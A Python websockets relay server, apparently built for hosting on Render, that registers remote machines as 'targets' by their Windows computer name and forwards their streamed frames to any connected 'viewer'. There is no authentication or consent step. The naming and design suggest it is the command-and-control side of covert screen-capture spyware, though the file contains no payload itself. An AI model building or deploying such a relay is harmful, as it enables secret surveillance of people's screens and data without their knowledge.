import asyncio
import json
import logging
import os
import websockets
from websockets.http11 import Response

logging.basicConfig(level=logging.INFO)

# Global states
live_targets = {}     
connected_viewers = set() 

async def process_request(connection, request):
    """
    Intercepts standard HTTP requests (like Render's HEAD/GET health checks)
    so the server doesn't crash, returning a clean 200 OK.
    """
    # If it's not a WebSocket upgrade request, treat it as a health check
    if "upgrade" not in request.headers.get("Connection", "").lower():
        logging.info(f"Received health check / HTTP request: {request.method}")
        return Response(
            status_code=200,
            reason_phrase="OK",
            headers=websockets.datastructures.Headers([
                ("Content-Type", "text/plain"),
                ("Connection", "close")
            ]),
            body=b"Healthy"
        )
    return None # Let websockets handle actual WS upgrades normally

async def handle_client(websocket):
    client_type = None
    target_name = None
    addr = websocket.remote_address
    logging.info(f"New WebSocket connection established from {addr}")

    try:
        async for message in websocket:
            payload = json.loads(message)
            msg_type = payload.get("type")

            if msg_type == "register_viewer":
                client_type = "viewer"
                connected_viewers.add(websocket)
                current_list = list(live_targets.keys())
                await websocket.send(json.dumps({"type": "list", "data": current_list}))

            elif msg_type == "register_target":
                client_type = "target"
                target_name = payload.get("COMPUTERNAME", f"Target-{addr[1]}")
                live_targets[target_name] = websocket
                await broadcast_to_viewers({"type": "list", "data": list(live_targets.keys())})

            elif msg_type == "stream_frame" and client_type == "target":
                frame_data = payload.get("frame")
                relay_payload = {
                    "type": "frame",
                    "user": target_name,
                    "frame": frame_data
                }
                await broadcast_to_viewers(relay_payload)
                await websocket.send(json.dumps({"status": "OK"}))

    except websockets.ConnectionClosed:
        pass
    except Exception as e:
        logging.error(f"Error handling connection: {e}")
    finally:
        if websocket in connected_viewers:
            connected_viewers.remove(websocket)
        if client_type == "target" and target_name in live_targets:
            del live_targets[target_name]
            await broadcast_to_viewers({"type": "list", "data": list(live_targets.keys())})

async def broadcast_to_viewers(payload_dict):
    if not connected_viewers:
        return
    message = json.dumps(payload_dict)
    await asyncio.gather(*[viewer.send(message) for viewer in connected_viewers], return_exceptions=True)

async def main():
    port = int(os.environ.get("PORT", 10000))
    logging.info(f"Starting server engine on port {port}...")
    
    # Pass our process_request hook into the server setup
    async with websockets.serve(handle_client, "0.0.0.0", port, process_request=process_request):
        await asyncio.Future() 

if __name__ == "__main__":
    asyncio.run(main())